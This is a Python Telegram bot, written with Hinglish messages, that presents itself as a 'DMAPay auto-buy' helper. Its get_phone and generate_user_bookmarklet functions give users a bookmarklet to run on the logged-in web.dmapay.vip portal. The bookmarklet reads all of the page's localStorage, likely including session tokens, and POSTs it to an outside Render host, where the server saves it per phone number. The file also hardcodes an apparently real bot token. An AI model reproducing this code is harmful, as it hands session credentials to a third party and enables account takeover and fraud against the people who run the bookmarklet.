import asyncio, json, os, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler
)

BOT_TOKEN = "9105269973:AAFtunQsu9g4roxGUi2RYTt_dSahQdIqlVw"
ACCOUNTS_FILE = "dmapay_accounts.json"
ASK_PHONE = range(1)
tg_app = None

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

def load_accounts():
    data = load_json(ACCOUNTS_FILE, {})
    return data if isinstance(data, dict) else {}

def save_accounts(data):
    save_json(ACCOUNTS_FILE, data)

def get_user_accounts(user_id: int):
    all_acc_db = load_accounts()
    return dict(all_acc_db.get(str(user_id), {}))

def save_user_session_clean(uid_str: str, phone: str, sess_json: dict):
    accs = load_accounts()
    if uid_str not in accs:
        accs[uid_str] = {}
    accs[uid_str][phone] = sess_json
    save_accounts(accs)

# Render HTTP Server with direct sync endpoint and CORS
class SyncServer(BaseHTTPRequestHandler):
    def _set_headers(self, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def do_OPTIONS(self):
        self._set_headers(200)

    def do_GET(self):
        self._set_headers(200)
        self.wfile.write(b'{"status":"active"}')

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path == "/sync":
            params = parse_qs(parsed.query)
            uid = params.get("uid", [""])[0]
            phone = params.get("phone", [""])[0]
            
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8")
            
            try:
                sess_json = json.loads(body)
                if uid and phone and sess_json:
                    save_user_session_clean(uid, phone, sess_json)
                    self._set_headers(200)
                    self.wfile.write(b'{"ok":true}')
                    
                    if tg_app:
                        asyncio.run_coroutine_threadsafe(
                            tg_app.bot.send_message(
                                chat_id=int(uid),
                                text=f"✅ **Account `{phone}` Successfully Sync Ho Gaya!**\n\nAb `/start` dabakar auto-buy setup karein.",
                                parse_mode="Markdown"
                            ),
                            tg_app.loop
                        )
                    return
            except Exception as e:
                pass
            
            self._set_headers(400)
            self.wfile.write(b'{"ok":false}')
        else:
            self._set_headers(404)
            self.wfile.write(b'{"error":"not found"}')

def run_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(("0.0.0.0", port), SyncServer)
    server.serve_forever()

def generate_user_bookmarklet(uid, phone) -> str:
    # Seedha Render app ko sync request bhejta hai
    return (
        f"javascript:(function(){{"
        f"var d={{}};for(var i=0;i<localStorage.length;i++){{var k=localStorage.key(i);d[k]=localStorage.getItem(k);}}"
        f"fetch('https://dmapay-bot.onrender.com/sync?uid={uid}&phone={phone}',{{"
        f"method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(d)}})"
        f".then(r=>r.json()).then(res=>{{if(res.ok){{alert('✅ Account {phone} Sync Successful! Bot me /start karein.');}}else{{alert('❌ Error: Server error');}}}})"
        f".catch(e=>alert('❌ Network Error: '+e));"
        f"}})();"
    )

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return
    user = update.effective_user
    if not user:
        return
    user_id = user.id
    
    context.user_data.clear()
    accounts = get_user_accounts(user_id)
    
    buttons = []
    for phone in accounts.keys():
        buttons.append([InlineKeyboardButton(f"📱 {phone} (Auto-Buy Setup)", callback_data=f"setup_{phone}")])
    
    buttons.append([InlineKeyboardButton("➕ Add Account / Sync", callback_data="add_acc")])
    
    txt = "🤖 **DMAPay Auto-Buy Bot**\n\nApna account chunein ya naya account jodein:"
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    else:
        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

async def add_acc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("👉 Apna **10-digit Phone Number** bhejein:", parse_mode="Markdown")
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Sahi 10-digit number dalein:", reply_markup=ReplyKeyboardRemove())
        return ASK_PHONE
    chat_id = str(update.effective_chat.id)
    
    bm = generate_user_bookmarklet(chat_id, phone)
    msg = (
        f"✅ **Number `{phone}` Register Ho Gaya!**\n\n"
        f"🔖 **Aapka Auto-Login Bookmark:**\n\n"
        f"`{bm}`\n\n"
        f"📌 **Kaise Use Karein:**\n"
        f"1. Is poore code ko copy karke browser me Bookmark banayein.\n"
        f"2. Portal (`web.dmapay.vip`) par login karke ye Bookmark run karein.\n"
        f"3. Turant sync alert aayega aur bot me confirmation mil jayegi!"
    )
    await update.message.reply_text(msg, reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")
    return ConversationHandler.END

async def setup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    phone = data.replace("setup_", "")
    context.user_data['active_phone'] = phone
    
    await query.answer()
    await query.edit_message_text(
        f"📱 **Account: `{phone}`**\n\n"
        "Ab apna **Amount ya Range** bhejein\n(Jaise exact `1000` ya range `1000-1500`):",
        parse_mode="Markdown"
    )

async def handle_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return
    text = update.message.text.strip()
    if '-' not in text and not text.isdigit():
        await update.message.reply_text("❌ Sahi format dalein! Jaise `1000` ya `1000-1500`:")
        return
    
    context.user_data['target_amount'] = text
    buttons = [
        [InlineKeyboardButton("💳 Mobikwik", callback_data="pay_Mobikwik"), InlineKeyboardButton("💳 Amazon", callback_data="pay_Amazon")],
        [InlineKeyboardButton("💳 All Modes", callback_data="pay_All")]
    ]
    await update.message.reply_text(
        f"✅ **Target Set:** `{text}`\n\nApna **Payment Mode** chunein:",
        reply_markup=InlineKeyboardMarkup(buttons),
        parse_mode="Markdown"
    )

async def payment_choice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    pay_mode = data.replace("pay_", "")
    phone = context.user_data.get('active_phone', '')
    target_amt = context.user_data.get('target_amount', '1000')
    
    await query.edit_message_text(f"🚀 **Auto-Buy Active!**\n📱 `{phone}` | 💰 Target: `{target_amt}` | 💳 {pay_mode}", parse_mode="Markdown")

def main():
    global tg_app
    threading.Thread(target=run_server, daemon=True).start()
    
    tg_app = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_acc_callback, pattern="^add_acc$")],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, get_phone)],
        },
        fallbacks=[CommandHandler("start", start_cmd)],
        allow_reentry=True
    )
    
    tg_app.add_handler(CommandHandler("start", start_cmd, filters=filters.ChatType.PRIVATE))
    tg_app.add_handler(conv_handler)
    tg_app.add_handler(CallbackQueryHandler(setup_callback, pattern="^setup_"))
    tg_app.add_handler(CallbackQueryHandler(payment_choice_callback, pattern="^pay_"))
    tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_amount_input))
    
    print("✅ DMAPay Bot Live...")
    tg_app.run_polling()

if __name__ == "__main__":
    main()
